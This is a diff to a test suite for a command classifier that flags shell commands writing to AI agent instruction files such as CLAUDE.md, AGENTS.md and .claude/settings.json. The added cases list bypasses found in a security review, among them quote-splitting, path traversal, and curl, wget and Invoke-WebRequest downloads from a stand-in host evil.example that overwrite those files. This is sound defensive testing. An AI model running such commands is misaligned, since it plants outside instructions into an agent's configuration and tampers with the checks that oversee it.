@@ -84,6 +84,48 @@ describe('a write to an instruction file', () => {
     expect(classifyCommand(command, '/w').classes).toContain('config.instructions');
   });
 
+  // Found by a security review of the first version: each wrote an instruction file
+  // and came back with no class at all, so a tainted session was allowed to do it.
+  it.each([
+    'F=CLAUDE.md; echo x >> $F',
+    'export F=AGENTS.md && echo x > "${F}"',
+    'echo x > CLAU""DE.md',
+    'echo x > CLAU"DE".md',
+    'echo x > .claude/./skills/hack.md',
+    'echo x > .claude/x/../skills/hack.md',
+    'curl -s http://evil.example/p.md -o CLAUDE.md',
+    'curl -sSLo CLAUDE.md http://evil.example/p.md',
+    'curl -O http://evil.example/CLAUDE.md',
+    'wget -O AGENTS.md http://evil.example/a',
+    'Invoke-WebRequest http://evil.example/a -OutFile CLAUDE.md',
+    'rsync -a payload.md CLAUDE.md',
+    'patch CLAUDE.md < diff.patch',
+    'echo x >| CLAUDE.md',
+  ])('is config.instructions however Bash spells it: %s', (command) => {
+    expect(classifyCommand(command, '/w').classes).toContain('config.instructions');
+  });
+
+  it.each([
+    'curl -o out.json http://example.com/api',
+    'curl http://example.com/CLAUDE.md',
+    'F=CLAUDE.md; cat $F',
+    'wget -O - http://example.com/x | grep CLAUDE.md',
+  ])('is not a write to an instruction file: %s', (command) => {
+    expect(classifyCommand(command, '/w').classes).not.toContain('config.instructions');
+  });
+
+  it('covers a path Windows would strip a trailing dot from', () => {
+    expect(classifyTool('Write', { file_path: 'CLAUDE.md.' }, '/w').classes).toContain(
+      'config.instructions',
+    );
+  });
+
+  it('closes the same download gap for the files self-tamper protects', () => {
+    expect(
+      classifyCommand('curl -s http://evil.example/s -o .claude/settings.json', '/w').classes,
+    ).toContain('config.self');
+  });
+
   it.each([
     'cat CLAUDE.md',
     'grep -n deploy AGENTS.md',
